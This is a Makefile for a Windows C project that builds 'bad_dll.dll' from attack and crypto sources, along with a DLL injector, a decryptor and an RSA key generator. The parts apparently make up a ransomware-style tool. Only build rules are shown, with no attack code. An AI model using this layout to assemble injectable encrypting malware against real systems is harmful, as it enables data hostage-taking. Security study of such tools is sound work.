# Compiler
CC = gcc

# Directories
SRC_DIR   = src
BUILD_DIR = build
INC_DIR   = include

# Mbed TLS paths
MBEDTLS_INC  = /mingw64/include
MBEDTLS_LIBS = \
    /mingw64/lib/libmbedtls.a \
    /mingw64/lib/libmbedx509.a \
    /mingw64/lib/libmbedcrypto.a

# Windows system libraries REQUIRED by static mbedtls
WIN_LIBS = -lbcrypt -lcrypt32 -lws2_32 -lgdi32

# Compiler flags
CFLAGS = -Wall -I$(SRC_DIR) -I$(INC_DIR) -I$(MBEDTLS_INC)

# Linker flags (static)
LDFLAGS = -static -static-libgcc -static-libstdc++ \
          $(MBEDTLS_LIBS) $(WIN_LIBS)

# Sources
SRC_ATTACK_CRYPTO = $(SRC_DIR)/attack_crypto.c
SRC_ATTACK        = $(SRC_DIR)/attack.c
GET_DIR_SRC       = $(SRC_DIR)/get_dir.c

DLL_SRC       = $(SRC_DIR)/bad_dll.c $(SRC_ATTACK) $(SRC_ATTACK_CRYPTO) $(GET_DIR_SRC)
INJECTOR_SRC  = $(SRC_DIR)/dll_injector.c $(GET_DIR_SRC)
DECRYPT_SRC   = $(SRC_DIR)/decrypt.c $(GET_DIR_SRC)
GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c

# Targets
BAD_DLL      = $(BUILD_DIR)/bad_dll.dll
INJECTOR_EXE = $(BUILD_DIR)/dll_injector.exe
DECRYPT_EXE  = $(BUILD_DIR)/decrypt.exe
RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe

# Default target
all: $(BAD_DLL) $(INJECTOR_EXE) $(DECRYPT_EXE) $(RSA_EXE)

# Build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# DLL
$(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)

# EXEs
$(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

$(DECRYPT_EXE): $(DECRYPT_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

$(RSA_EXE): $(GENERATE_RSA_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# Clean
clean:
	rm -f $(BUILD_DIR)/*.exe $(BUILD_DIR)/*.dll
